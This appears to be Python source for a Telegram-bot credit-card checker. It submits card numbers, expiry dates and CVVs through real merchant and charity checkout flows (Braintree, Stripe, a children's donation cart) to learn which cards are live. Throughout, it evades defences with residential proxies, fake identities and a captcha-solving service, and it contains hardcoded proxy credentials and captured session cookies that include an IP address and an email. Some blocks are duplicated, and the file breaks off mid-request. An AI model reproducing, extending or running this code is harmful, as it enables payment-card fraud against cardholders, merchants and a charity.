                #'sessionId': '594537f6-2de1-4307-9162-da10408d2d93',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = curl.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token_cc = (response.json())['data']['tokenizeCreditCard']['token']



        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.gud-shop.com',
            'Referer': 'https://www.gud-shop.com/en/my-account/add-payment-method/',
        }

        data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': brand,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token_cc,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': wp_nonce,
        '_wp_http_referer': '/en/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
        'trp-form-language': 'en',
        'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QgdHJwLWZvcm0tbGFuZ3VhZ2UiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxMX19'
        }

        response = curl.post('https://www.gud-shop.com/en/my-account/add-payment-method/', headers=headers, data=data)
        if 'New payment method added' in response.text or 'Duplicate card exists in the vault' in response.text:
            return { '✅ Approved'}
        message = BeautifulSoup(response.content, 'html.parser').find('div', {'class': 'message-container container alert-color medium-text-center'})
        
        if message:
            return {"❌"+ message.text.strip()}
        else:
            return { '❌ Unknown error'}
    
    except Exception as e:
          return { f'❌ Error {e}'}
    

import time
from telegram.constants import ParseMode  # Asegúrate de usar esta importación

# ID del grupo al que quieres enviar los mensajes
GRUPO_CHAT_ID = 846983753









import time
from telegram.constants import ParseMode  # Asegúrate de usar esta importación

# ID del grupo al que quieres enviar los mensajes
GRUPO_CHAT_ID = 846983753



def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
async def comandoc(card: str) -> str:
    
            #============[Funcions Need]============#
             #============[Funcions Need]============#
            c = requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }

            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {
                'authority': 'liveexpertly.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                # 'cookie': 'PHPSESSID=d10f15s7mt31a4bm2554r7su72; pmpro_visit=1; __stripe_sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710; __stripe_mid=cb8faca5-8c35-426f-846a-6c7cd8245920027498',
                'pragma': 'no-cache',
                'referer': 'https://liveexpertly.com/membership-account/membership-levels/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'level': '1',
            }

            response = c.get(
                'https://liveexpertly.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                proxies=proxys
            )
            print(response)
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=115610&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=cb8faca5-8c35-426f-846a-6c7cd8245920027498&sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710&key=pk_live_Se2DgkT5sExZVlJeeDh72iLU009HNVQSoC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[exp_month]={mes}&card[exp_year]={ano_number}&card[cvc]={cvv}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, proxies=proxys)
            print(response)
            responsePm = json.loads(response.text)
            token = responsePm['id']
            headers = {
                'authority': 'liveexpertly.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'PHPSESSID=d10f15s7mt31a4bm2554r7su72; pmpro_visit=1; __stripe_sid=37a86df1-c0dd-4882-9b65-7e97008bcaf333b710; __stripe_mid=cb8faca5-8c35-426f-846a-6c7cd8245920027498',
                'origin': 'https://liveexpertly.com',
                'pragma': 'no-cache',
                'referer': 'https://liveexpertly.com/membership-account/membership-checkout/?level=1',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'level': '1',
            }

            data = {
                'level': '1',
                'checkjavascript': '1',
                'other_discount_code': '',
                'username': name+last+str(number),
                'password': 'saiper123',
                'password2': 'saiper123',
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': 'Visa',
                'discount_code': '',
                'submit-checkout': '1',
                'javascriptok': '1',
                'stripeToken0': token,
                'AccountNumber': cc_number,
                'ExpirationMonth': mes,
                'ExpirationYear': ano_number,
            }

            responseChk = c.post(
                'https://liveexpertly.com/membership-account/membership-checkout/',
                params=params,
                headers=headers,
                data=data,
                proxies=proxys
            )
            soup = b(responseChk.text, 'html.parser')
            response_text = responseChk.text

            # Intentar parsear como JSON
           # Intentar parsear como JSON
            try:
                    response_data = json.loads(response_text)
                    
                    # Comprobar si hay errores
                    if response_data.get("HasErrors"):
                        errors = response_data.get("Errors", [])
                        if errors:
                            print(f"Error: {errors[0]}")
                            return errors[0]
                        else:
                            print("Error desconocido.")
                            return "Error desconocido."
                    else:
                        if response_data.get("LineItems") and response_data["LineItems"][0].get("Paid"):
                            print("Approved.")
                            return "Approved."
                        else:
                            print("Estado del pago desconocido.")
                            return "Estado del pago desconocido."
                            
            except json.JSONDecodeError:
                    # Si no es JSON, intentamos parsear el HTML
                    soup = b(response_text, 'html.parser')
                    
                    # Buscar div con clase y ID específicos
                    error_message = soup.find('div', {'class': 'pmpro_message pmpro_error', 'id': 'pmpro_message'})
                    
                    if error_message:
                        print(f"Error: {error_message.text.strip()}")
                        return error_message.text.strip()
                    else:
                        print("No se pudo encontrar un mensaje de error.")
                        return "No se pudo encontrar un mensaje de error."
                
           
           
        
            
        
   
    

import time
from telegram.constants import ParseMode  # Asegúrate de usar esta importación



def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
async def comandoan(card: str) -> str:
    
            c =  requests.Session()
            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
            contraseña = "Saiper123"
            host = "us.resiproxies.net"
            puerto = "16666"

            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"

            c.proxies = {
                "http": proxy_url,
                "https": proxy_url
            }
           
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#
            headers = {
                    'authority': 'www.children.org',
                    'accept': '*/*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; EPi_NumberOfVisits=16,2025-02-19T05:08:50,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

            data = {
                    'Amount': '5',
                    'ProductOptionId': '6',
                    'Description': 'Our mission',
                    'BlockGuid': 'd180694e-c81a-4dee-82a9-ab0e080e0883',
                }

            response = c.post('https://www.children.org/api/cart/add', headers=headers, data=data)


            headers = {
                    'authority': 'www.children.org',
                    'accept': '*/*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    # 'content-length': '0',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i; EPi_NumberOfVisits=17,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

            response = c.post('https://www.children.org/api/cart/getcartcount', headers=headers)

            headers = {
                    'authority': 'www.children.org',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; FPGSID=1.1741984694.1741984694.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; gtm_page_view=2; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984704.48.0.0; Cookie - Page Count=2; engagementcount=2; _clsk=1oxk4sc%7C1741984705276%7C2%7C1%7Ci.clarity.ms%2Fcollect; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741984706.0.0.950301738; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984705755|2|1|bat.bing.com/p/insights/c/i; EPi_NumberOfVisits=17,2025-02-19T05:08:52,2025-02-19T05:08:54,2025-02-19T05:08:58,2025-02-19T05:09:24,2025-02-19T05:10:30,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/make-a-difference/donate',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

            response = c.get('https://www.children.org/checkout',  headers=headers)
            print("pase le req de egregar")
            headers = {
                    'authority': 'www.children.org',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/json',
                    # 'cookie': 'PersistentSession=099256036372BF45E208D01B50B5EBA0E8AFA371F85FF548401EAFAA42506404AFEE8C2C69F03F59B72006A0826CF47276A910E5E3846228283A523F30103008A83DF6492B7821D36FE15FB0F8E5219EF2B0337B3C5E8AD1DD009AE6A8873E331D3CB1764E8264EF53367959244CC1C5BB12F074; _ga=GA1.1.2091152227.1739941710; FPID=FPID2.2.NbfJgKbJBigBXyhFGUDGloIxtaujEMMsDX4lqaMgiTY%3D.1739941710; _gcl_au=1.1.1596859538.1739941711; _fbp=fb.1.1739941711764.190566978271505289; __tmbid=us-1739941713-489f6bbcd9974664aad8542d1b29d68b; __stripe_mid=b3988ef2-f2f6-4ccb-bf93-3973dcc00e5967d1fd; lang=en-US; zSessionId=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; cookietimer=0; cookietimerid=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; engagementorigin=https://www.children.org/checkout#/details; _clck=ooqm3r%7C2%7Cfu7%7C0%7C1876; FPLC=K3A6MyDV5ThHKOBJ4dG5L5hOVYz8XEzFSAZwX9B8y9AaiYgXFx8sWMTWhkTjhTdv6Us77eNjn5x2k2U8o7IZ1yGKlx9dr9YPXEkcebCiKYkxHsyRgLzer%2FSKSGctTA%3D%3D; m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601_mindmax=m898pjiu01nobqppsfxqbmxrgm6y2ds1ryo0cbk28601; mindmaxipaddress=187.252.251.170; mindmaxcity=OthÃ³n P. Blanco; mindmaxsubdivisionisocode=ROO; mindmaxcountryisocode=MX; mindmaxpostalcode=77083; mindmaxusertype=none; mindmaxorganization=izzi; 57942=; 58312=; 58313=; 59942=; 57928=; 58306=; 59941=; 57927=; 57941=; 58305=; __stripe_sid=36a4a8fe-b091-45e5-8412-81345f30407463f885; engagementcount=2; gtm_page_view=3; pid=; BNES_pid=; Cookie - Page Count=3; _ga_430T8HQLMJ=GS1.1.1741984692.3.1.1741984796.59.0.1977592029; _clsk=1oxk4sc%7C1741984796608%7C3%7C1%7Ci.clarity.ms%2Fcollect; _uetsid=40931b20011411f089bda7d987097b40|dw3huw|2|fu7|0|1899; _uetvid=8fe50b90ee7f11efabd13f9dbfd25fc0|113uane|1741984798402|3|1|bat.bing.com/p/insights/c/i; FPGSID=1.1741984694.1741985020.G-430T8HQLMJ.qtkgnegr5PASquoLHU1sLA.G-SFLND5SZVL.iQ53RWOE_CZqdt33E9TZ9g; general_email_submitted=dssljwwsk@msn.com; EPi_NumberOfVisits=22,2025-03-14T20:38:11,2025-03-14T20:38:13,2025-03-14T20:38:25,2025-03-14T20:38:25,2025-03-14T20:39:55,2025-03-14T20:39:55,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:39:56,2025-03-14T20:43:45; _ga_SFLND5SZVL=GS1.1.1741984692.3.1.1741985041.0.0.950301738',
                    'origin': 'https://www.children.org',
                    'pragma': 'no-cache',
                    'referer': 'https://www.children.org/checkout',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                }

            json_data = {
                    'addressLine1': 'Calle 67',
                    'addressLine2': '',
                    'city': 'Teabo',
                    'stateId': '96',
                    'postalCode': '97910',
                    'countryId': '148',
                }

            response = c.post(
                    'https://www.children.org/api/locations/validateAddress',
                    headers=headers,
                    json=json_data,
                )
            print("pase le req de direccion")
            headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'accept-language': 'es-ES,es;q=0.9',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'pragma': 'no-cache',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
